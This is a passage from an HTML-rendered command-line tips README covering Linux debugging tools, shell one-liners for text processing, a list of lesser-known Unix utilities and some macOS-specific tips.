&lt;p&gt;For looking at why a disk is full, &lt;a href="https://dev.yorhel.nl/ncdu" rel="nofollow"&gt;&lt;code&gt;ncdu&lt;/code&gt;&lt;/a&gt; saves time over the usual commands like &lt;code&gt;du -sh *&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To find which socket or process is using bandwidth, try &lt;a href="http://www.ex-parrot.com/~pdw/iftop/" rel="nofollow"&gt;&lt;code&gt;iftop&lt;/code&gt;&lt;/a&gt; or &lt;a href="https://github.com/raboof/nethogs"&gt;&lt;code&gt;nethogs&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;ab&lt;/code&gt; tool (comes with Apache) is helpful for quick-and-dirty checking of web server performance. For more complex load testing, try &lt;code&gt;siege&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For more serious network debugging, &lt;a href="https://wireshark.org/" rel="nofollow"&gt;&lt;code&gt;wireshark&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://www.wireshark.org/docs/wsug_html_chunked/AppToolstshark.html" rel="nofollow"&gt;&lt;code&gt;tshark&lt;/code&gt;&lt;/a&gt;, or &lt;a href="http://ngrep.sourceforge.net/" rel="nofollow"&gt;&lt;code&gt;ngrep&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know about &lt;code&gt;strace&lt;/code&gt; and &lt;code&gt;ltrace&lt;/code&gt;. These can be helpful if a program is failing, hanging, or crashing, and you don't know why, or if you want to get a general idea of performance. Note the profiling option (&lt;code&gt;-c&lt;/code&gt;), and the ability to attach to a running process (&lt;code&gt;-p&lt;/code&gt;). Use trace child option (&lt;code&gt;-f&lt;/code&gt;) to avoid missing important calls.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know about &lt;code&gt;ldd&lt;/code&gt; to check shared libraries etc — but &lt;a href="http://www.catonmat.net/blog/ldd-arbitrary-code-execution/" rel="nofollow"&gt;never run it on untrusted files&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know how to connect to a running process with &lt;code&gt;gdb&lt;/code&gt; and get its stack traces.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;/proc&lt;/code&gt;. It's amazingly helpful sometimes when debugging live problems. Examples: &lt;code&gt;/proc/cpuinfo&lt;/code&gt;, &lt;code&gt;/proc/meminfo&lt;/code&gt;, &lt;code&gt;/proc/cmdline&lt;/code&gt;, &lt;code&gt;/proc/xxx/cwd&lt;/code&gt;, &lt;code&gt;/proc/xxx/exe&lt;/code&gt;, &lt;code&gt;/proc/xxx/fd/&lt;/code&gt;, &lt;code&gt;/proc/xxx/smaps&lt;/code&gt; (where &lt;code&gt;xxx&lt;/code&gt; is the process id or pid).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;When debugging why something went wrong in the past, &lt;a href="http://sebastien.godard.pagesperso-orange.fr/" rel="nofollow"&gt;&lt;code&gt;sar&lt;/code&gt;&lt;/a&gt; can be very helpful. It shows historic statistics on CPU, memory, network, etc.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For deeper systems and performance analyses, look at &lt;code&gt;stap&lt;/code&gt; (&lt;a href="https://sourceware.org/systemtap/wiki" rel="nofollow"&gt;SystemTap&lt;/a&gt;), &lt;a href="https://en.wikipedia.org/wiki/Perf_%28Linux%29" rel="nofollow"&gt;&lt;code&gt;perf&lt;/code&gt;&lt;/a&gt;, and &lt;a href="https://github.com/draios/sysdig"&gt;&lt;code&gt;sysdig&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Check what OS you're on with &lt;code&gt;uname&lt;/code&gt; or &lt;code&gt;uname -a&lt;/code&gt; (general Unix/kernel info) or &lt;code&gt;lsb_release -a&lt;/code&gt; (Linux distro info).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;dmesg&lt;/code&gt; whenever something's acting really funny (it could be hardware or driver issues).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If you delete a file and it doesn't free up expected disk space as reported by &lt;code&gt;du&lt;/code&gt;, check whether the file is in use by a process:
&lt;code&gt;lsof | grep deleted | grep "filename-of-my-big-file"&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-one-liners" class="anchor" aria-hidden="true" href="#one-liners"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;One-liners&lt;/h2&gt;
&lt;p&gt;A few examples of piecing together commands:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It is remarkably helpful sometimes that you can do set intersection, union, and difference of text files via &lt;code&gt;sort&lt;/code&gt;/&lt;code&gt;uniq&lt;/code&gt;. Suppose &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; are text files that are already uniqued. This is fast, and works on files of arbitrary size, up to many gigabytes. (Sort is not limited by memory, though you may need to use the &lt;code&gt;-T&lt;/code&gt; option if &lt;code&gt;/tmp&lt;/code&gt; is on a small root partition.) See also the note about &lt;code&gt;LC_ALL&lt;/code&gt; above and &lt;code&gt;sort&lt;/code&gt;'s &lt;code&gt;-u&lt;/code&gt; option (left out for clarity below).&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      sort a b &lt;span class="pl-k"&gt;|&lt;/span&gt; uniq &lt;span class="pl-k"&gt;&amp;gt;&lt;/span&gt; c   &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; c is a union b&lt;/span&gt;
      sort a b &lt;span class="pl-k"&gt;|&lt;/span&gt; uniq -d &lt;span class="pl-k"&gt;&amp;gt;&lt;/span&gt; c   &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; c is a intersect b&lt;/span&gt;
      sort a b b &lt;span class="pl-k"&gt;|&lt;/span&gt; uniq -u &lt;span class="pl-k"&gt;&amp;gt;&lt;/span&gt; c   &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; c is set difference a - b&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Pretty-print two JSON files, normalizing their syntax, then coloring and paginating the result:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;      diff &amp;lt;(jq --sort-keys . &amp;lt; file1.json) &amp;lt;(jq --sort-keys . &amp;lt; file2.json) | colordiff | less -R
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;grep . *&lt;/code&gt; to quickly examine the contents of all files in a directory (so each line is paired with the filename), or &lt;code&gt;head -100 *&lt;/code&gt; (so each file has a heading). This can be useful for directories filled with config settings like those in &lt;code&gt;/sys&lt;/code&gt;, &lt;code&gt;/proc&lt;/code&gt;, &lt;code&gt;/etc&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Summing all numbers in the third column of a text file (this is probably 3X faster and 3X less code than equivalent Python):&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      awk &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;{ x += $3 } END { print x }&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; myfile&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;To see sizes/dates on a tree of files, this is like a recursive &lt;code&gt;ls -l&lt;/code&gt; but is easier to read than &lt;code&gt;ls -lR&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      find &lt;span class="pl-c1"&gt;.&lt;/span&gt; -type f -ls&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Say you have a text file, like a web server log, and a certain value that appears on some lines, such as an &lt;code&gt;acct_id&lt;/code&gt; parameter that is present in the URL. If you want a tally of how many requests for each &lt;code&gt;acct_id&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      egrep -o &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;acct_id=[0-9]+&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; access.log &lt;span class="pl-k"&gt;|&lt;/span&gt; cut -d= -f2 &lt;span class="pl-k"&gt;|&lt;/span&gt; sort &lt;span class="pl-k"&gt;|&lt;/span&gt; uniq -c &lt;span class="pl-k"&gt;|&lt;/span&gt; sort -rn&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;To continuously monitor changes, use &lt;code&gt;watch&lt;/code&gt;, e.g. check changes to files in a directory with &lt;code&gt;watch -d -n 2 'ls -rtlh | tail'&lt;/code&gt; or to network settings while troubleshooting your wifi settings with &lt;code&gt;watch -d -n 2 ifconfig&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run this function to get a random tip from this document (parses Markdown and extracts an item):&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      &lt;span class="pl-k"&gt;function&lt;/span&gt; &lt;span class="pl-en"&gt;taocl()&lt;/span&gt; {
        curl -s https://raw.githubusercontent.com/jlevy/the-art-of-command-line/master/README.md &lt;span class="pl-k"&gt;|&lt;/span&gt;
          sed &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;/cowsay[.]png/d&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;|&lt;/span&gt;
          pandoc -f markdown -t html &lt;span class="pl-k"&gt;|&lt;/span&gt;
          xmlstarlet fo --html --dropdtd &lt;span class="pl-k"&gt;|&lt;/span&gt;
          xmlstarlet sel -t -v &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;(html/body/ul/li[count(p)&amp;gt;0])[&lt;span class="pl-smi"&gt;$RANDOM&lt;/span&gt; mod last()+1]&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;|&lt;/span&gt;
          xmlstarlet unesc &lt;span class="pl-k"&gt;|&lt;/span&gt; fmt -80 &lt;span class="pl-k"&gt;|&lt;/span&gt; iconv -t US
      }&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;a id="user-content-obscure-but-useful" class="anchor" aria-hidden="true" href="#obscure-but-useful"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Obscure but useful&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;expr&lt;/code&gt;: perform arithmetic or boolean operations or evaluate regular expressions&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;m4&lt;/code&gt;: simple macro processor&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;yes&lt;/code&gt;: print a string a lot&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;cal&lt;/code&gt;: nice calendar&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;env&lt;/code&gt;: run a command (useful in scripts)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;printenv&lt;/code&gt;: print out environment variables (useful in debugging and scripts)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;look&lt;/code&gt;: find English words (or lines in a file) beginning with a string&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;cut&lt;/code&gt;, &lt;code&gt;paste&lt;/code&gt; and &lt;code&gt;join&lt;/code&gt;: data manipulation&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;fmt&lt;/code&gt;: format text paragraphs&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;pr&lt;/code&gt;: format text into pages/columns&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;fold&lt;/code&gt;: wrap lines of text&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;column&lt;/code&gt;: format text fields into aligned, fixed-width columns or tables&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;expand&lt;/code&gt; and &lt;code&gt;unexpand&lt;/code&gt;: convert between tabs and spaces&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nl&lt;/code&gt;: add line numbers&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;seq&lt;/code&gt;: print numbers&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;bc&lt;/code&gt;: calculator&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;factor&lt;/code&gt;: factor integers&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://gnupg.org/" rel="nofollow"&gt;&lt;code&gt;gpg&lt;/code&gt;&lt;/a&gt;: encrypt and sign files&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;toe&lt;/code&gt;: table of terminfo entries&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nc&lt;/code&gt;: network debugging and data transfer&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;socat&lt;/code&gt;: socket relay and tcp port forwarder (similar to &lt;code&gt;netcat&lt;/code&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/mattthias/slurm"&gt;&lt;code&gt;slurm&lt;/code&gt;&lt;/a&gt;: network traffic visualization&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;dd&lt;/code&gt;: moving data between files or devices&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;file&lt;/code&gt;: identify type of a file&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;tree&lt;/code&gt;: display directories and subdirectories as a nesting tree; like &lt;code&gt;ls&lt;/code&gt; but recursive&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;stat&lt;/code&gt;: file info&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;time&lt;/code&gt;: execute and time a command&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;timeout&lt;/code&gt;: execute a command for specified amount of time and stop the process when the specified amount of time completes.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;lockfile&lt;/code&gt;: create semaphore file that can only be removed by &lt;code&gt;rm -f&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;logrotate&lt;/code&gt;: rotate, compress and mail logs.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;watch&lt;/code&gt;: run a command repeatedly, showing results and/or highlighting changes&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/joh/when-changed"&gt;&lt;code&gt;when-changed&lt;/code&gt;&lt;/a&gt;: runs any command you specify whenever it sees file changed. See &lt;code&gt;inotifywait&lt;/code&gt; and &lt;code&gt;entr&lt;/code&gt; as well.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;tac&lt;/code&gt;: print files in reverse&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;comm&lt;/code&gt;: compare sorted files line by line&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;strings&lt;/code&gt;: extract text from binary files&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;tr&lt;/code&gt;: character translation or manipulation&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;iconv&lt;/code&gt; or &lt;code&gt;uconv&lt;/code&gt;: conversion for text encodings&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;split&lt;/code&gt; and &lt;code&gt;csplit&lt;/code&gt;: splitting files&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;sponge&lt;/code&gt;: read all input before writing it, useful for reading from then writing to the same file, e.g., &lt;code&gt;grep -v something some-file | sponge some-file&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;units&lt;/code&gt;: unit conversions and calculations; converts furlongs per fortnight to twips per blink (see also &lt;code&gt;/usr/share/units/definitions.units&lt;/code&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;apg&lt;/code&gt;: generates random passwords&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;xz&lt;/code&gt;: high-ratio file compression&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;ldd&lt;/code&gt;: dynamic library info&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nm&lt;/code&gt;: symbols from object files&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;ab&lt;/code&gt; or &lt;a href="https://github.com/wg/wrk"&gt;&lt;code&gt;wrk&lt;/code&gt;&lt;/a&gt;: benchmarking web servers&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;strace&lt;/code&gt;: system call debugging&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.bitwizard.nl/mtr/" rel="nofollow"&gt;&lt;code&gt;mtr&lt;/code&gt;&lt;/a&gt;: better traceroute for network debugging&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;cssh&lt;/code&gt;: visual concurrent shell&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;rsync&lt;/code&gt;: sync files and folders over SSH or in local file system&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://wireshark.org/" rel="nofollow"&gt;&lt;code&gt;wireshark&lt;/code&gt;&lt;/a&gt; and &lt;a href="https://www.wireshark.org/docs/wsug_html_chunked/AppToolstshark.html" rel="nofollow"&gt;&lt;code&gt;tshark&lt;/code&gt;&lt;/a&gt;: packet capture and network debugging&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://ngrep.sourceforge.net/" rel="nofollow"&gt;&lt;code&gt;ngrep&lt;/code&gt;&lt;/a&gt;: grep for the network layer&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;host&lt;/code&gt; and &lt;code&gt;dig&lt;/code&gt;: DNS lookups&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;lsof&lt;/code&gt;: process file descriptor and socket info&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;dstat&lt;/code&gt;: useful system stats&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/nicolargo/glances"&gt;&lt;code&gt;glances&lt;/code&gt;&lt;/a&gt;: high level, multi-subsystem overview&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;iostat&lt;/code&gt;: Disk usage stats&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;mpstat&lt;/code&gt;: CPU usage stats&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;vmstat&lt;/code&gt;: Memory usage stats&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;htop&lt;/code&gt;: improved version of top&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;last&lt;/code&gt;: login history&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;w&lt;/code&gt;: who's logged on&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;id&lt;/code&gt;: user/group identity info&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://sebastien.godard.pagesperso-orange.fr/" rel="nofollow"&gt;&lt;code&gt;sar&lt;/code&gt;&lt;/a&gt;: historic system stats&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.ex-parrot.com/~pdw/iftop/" rel="nofollow"&gt;&lt;code&gt;iftop&lt;/code&gt;&lt;/a&gt; or &lt;a href="https://github.com/raboof/nethogs"&gt;&lt;code&gt;nethogs&lt;/code&gt;&lt;/a&gt;: network utilization by socket or process&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;ss&lt;/code&gt;: socket statistics&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;dmesg&lt;/code&gt;: boot and system error messages&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;sysctl&lt;/code&gt;: view and configure Linux kernel parameters at run time&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;hdparm&lt;/code&gt;: SATA/ATA disk manipulation/performance&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;lsblk&lt;/code&gt;: list block devices: a tree view of your disks and disk partitions&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;lshw&lt;/code&gt;, &lt;code&gt;lscpu&lt;/code&gt;, &lt;code&gt;lspci&lt;/code&gt;, &lt;code&gt;lsusb&lt;/code&gt;, &lt;code&gt;dmidecode&lt;/code&gt;: hardware information, including CPU, BIOS, RAID, graphics, devices, etc.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;lsmod&lt;/code&gt; and &lt;code&gt;modinfo&lt;/code&gt;: List and show details of kernel modules.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;fortune&lt;/code&gt;, &lt;code&gt;ddate&lt;/code&gt;, and &lt;code&gt;sl&lt;/code&gt;: um, well, it depends on whether you consider steam locomotives and Zippy quotations "useful"&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-macos-only" class="anchor" aria-hidden="true" href="#macos-only"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;macOS only&lt;/h2&gt;
&lt;p&gt;These are items relevant &lt;em&gt;only&lt;/em&gt; on macOS.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Package management with &lt;code&gt;brew&lt;/code&gt; (Homebrew) and/or &lt;code&gt;port&lt;/code&gt; (MacPorts). These can be used to install on macOS many of the above commands.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Copy output of any command to a desktop app with &lt;code&gt;pbcopy&lt;/code&gt; and paste input from one with &lt;code&gt;pbpaste&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To enable the Option key in macOS Terminal as an alt key (such as used in the commands above like &lt;strong&gt;alt-b&lt;/strong&gt;, &lt;strong&gt;alt-f&lt;/strong&gt;, etc.), open Preferences -&amp;gt; Profiles -&amp;gt; Keyboard and select "Use Option as Meta key".&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To open a file with a desktop app, use &lt;code&gt;open&lt;/code&gt; or &lt;code&gt;open -a /Applications/Whatever.app&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Spotlight: Search files with &lt;code&gt;mdfind&lt;/code&gt; and list metadata (such as photo EXIF info) with &lt;code&gt;mdls&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Be aware macOS is based on BSD Unix, and many commands (for example &lt;code&gt;ps&lt;/code&gt;, &lt;code&gt;ls&lt;/code&gt;, &lt;code&gt;tail&lt;/code&gt;, &lt;code&gt;awk&lt;/code&gt;, &lt;code&gt;sed&lt;/code&gt;) have many subtle variations from Linux, which is largely influenced by System V-style Unix and GNU tools. You can often tell the difference by noting a man page has the heading "BSD General Commands Manual." In some cases GNU versions can be installed, too (such as &lt;code&gt;gawk&lt;/code&gt; and &lt;code&gt;gsed&lt;/code&gt; for GNU awk and sed). If writing cross-platform Bash scripts, avoid such commands (for example, consider Python or &lt;code&gt;perl&lt;/code&gt;) or test carefully.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To get macOS release information, use &lt;code&gt;sw_vers&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-windows-only" class="anchor" aria-hidden="true" href="#windows-only"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Windows only&lt;/h2&gt;
&lt;p&gt;These items are relevant &lt;em&gt;only&lt;/em&gt; on Windows.&lt;/p&gt;
